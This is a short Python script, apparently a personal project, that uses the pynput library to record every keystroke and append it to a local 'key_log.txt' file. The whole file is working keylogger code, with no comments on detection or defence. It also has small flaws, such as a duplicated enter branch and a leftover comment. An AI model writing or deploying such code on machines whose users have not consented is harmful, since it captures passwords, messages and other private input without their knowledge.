from pynput.keyboard import Key, Listener
import logging

log_dir = "/Users/Administrator/workspace/Projects/Keylogger/src/"

#logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    #logging.info(str(key))
    
    # Open a file with access mode 'a'
    file_object = open(log_dir + "key_log.txt", 'a')
    # Append 'hello' at the end of file
    if str(key) == "Key.space":
        file_object.write(" ")
    elif str(key) == "Key.enter":
        file_object.write("\n")  
    elif str(key) == "Key.shift":
        file_object.write("") 
    elif str(key) == "Key.backspace":
        file_object.write("") 
    elif str(key) == "Key.enter":
        file_object.write("\n")                 
    else:
        file_object.write(str(key).replace('\'', ''))
    # Close the file
    file_object.close()    

with Listener(on_press=on_press) as listener:
    listener.join()
    
